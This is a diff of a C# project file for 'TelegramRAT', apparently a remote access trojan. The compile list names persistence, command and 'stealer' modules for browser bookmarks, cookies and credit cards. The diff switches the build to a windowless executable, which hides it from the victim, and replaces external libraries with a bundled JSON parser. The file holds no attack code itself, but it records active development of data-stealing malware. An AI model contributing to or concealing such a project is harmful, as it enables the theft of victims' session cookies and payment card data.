@@ -5,7 +5,7 @@
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{1BCFE538-14F4-4BEB-9A3F-3F9472794902}</ProjectGuid>
-    <OutputType>Exe</OutputType>
+    <OutputType>WinExe</OutputType>
     <RootNamespace>TelegramRAT</RootNamespace>
     <AssemblyName>TelegramRAT</AssemblyName>
     <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
@@ -38,10 +38,6 @@
     <StartupObject />
   </PropertyGroup>
   <ItemGroup>
-    <Reference Include="Newtonsoft.Json, Version=11.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
-      <SpecificVersion>False</SpecificVersion>
-      <HintPath>core\libs\Newtonsoft.Json.dll</HintPath>
-    </Reference>
     <Reference Include="Sodium">
       <HintPath>core\libs\Sodium.dll</HintPath>
     </Reference>
@@ -58,16 +54,13 @@
     <Reference Include="Microsoft.CSharp" />
     <Reference Include="System.Data" />
     <Reference Include="System.Xml" />
-    <Reference Include="Telegram.Bot, Version=15.5.1.0, Culture=neutral, processorArchitecture=MSIL">
-      <SpecificVersion>False</SpecificVersion>
-      <HintPath>core\libs\Telegram.Bot.dll</HintPath>
-    </Reference>
   </ItemGroup>
   <ItemGroup>
     <Compile Include="config.cs" />
     <Compile Include="core\commands.cs" />
     <Compile Include="core\core.cs" />
     <Compile Include="core\persistense.cs" />
+    <Compile Include="core\SimpleJSON.cs" />
     <Compile Include="core\stealer\Bookmarks.cs" />
     <Compile Include="core\stealer\Cookies.cs" />
     <Compile Include="core\stealer\CreditCards.cs" />
